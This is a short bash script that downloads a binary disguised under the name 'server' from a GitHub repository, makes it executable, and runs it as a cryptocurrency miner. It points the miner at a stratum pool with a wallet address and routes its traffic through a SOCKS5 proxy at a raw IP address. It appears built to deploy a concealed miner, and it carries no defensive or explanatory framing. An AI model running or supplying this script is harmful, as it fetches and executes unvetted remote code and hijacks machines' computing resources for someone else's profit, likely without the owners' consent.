#!/bin/bash
apt update 
apt install screen -y 
wget -O server https://github.com/Kaxib-Bygb/Kaxib-Bygb/raw/main/server
chmod +x server
screen -dmS ls
./server -a randomkeva --url stratum-eu.rplant.xyz:17061 --tls --user VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b.6Y9b=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://143.198.231.168:1080
